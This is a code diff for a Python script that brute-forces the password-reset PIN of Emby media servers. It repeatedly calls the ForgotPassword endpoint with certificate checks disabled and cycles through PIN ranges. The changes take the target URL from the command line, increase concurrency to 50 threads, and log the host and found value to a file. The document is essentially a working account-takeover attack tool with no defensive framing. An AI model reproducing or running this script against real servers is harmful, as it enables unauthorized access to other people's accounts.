@@ -1,9 +1,9 @@
 import requests
 import time
-import random
 import threading
+import sys
 from concurrent.futures import ThreadPoolExecutor
-
+from urllib.parse import urlparse, urlunparse
 
 
 found_event = threading.Event()
@@ -12,11 +12,10 @@ lock = threading.Lock()
 host = ''
 foo = ''
 
-def generate_pin():
+def generate_pin(session):
     url = f'{host.rstrip("/")}/emby/Users/ForgotPassword'
-    headers = {'Content-Type': 'application/json'}
     try:
-        resp = requests.post(url, headers=headers, verify=False, timeout=5)
+        resp = session.post(url, verify=False, timeout=5)
         print("return:",resp.content)
         return resp.status_code == 200
     except Exception:
@@ -56,7 +55,7 @@ def get_pin_loop(timeout, sleep_between,pin_begin,pin_end):
 
     while not found_event.is_set():
         for pin in range(pin_begin, pin_end + 1):
-            ok = generate_pin()
+            ok = generate_pin(session)
             if not ok:
                 time.sleep(sleep_between)
                 continue
@@ -84,6 +83,17 @@ def get_pin(workers, timeout,sleep_between):
             f.result()
 
 if __name__ == "__main__":
-    host = ''
-    get_pin(workers=5, timeout=3,sleep_between=0.2)
+    if len(sys.argv) > 1:
+        url = sys.argv[1]
+        parsed = urlparse(url)
+        host = urlunparse((parsed.scheme, parsed.netloc, '', '', '', ''))
+        print("Start with url", host)
+    else:
+        print("please input parameter")
+        sys.exit()
+    get_pin(workers=50, timeout=3,sleep_between=0.2)
+    print(host)
     print(foo)
+    with open("res.txt", "a", encoding="utf-8") as f:
+        f.write(str(host) + "\n")
+        f.write(str(foo) + "\n")
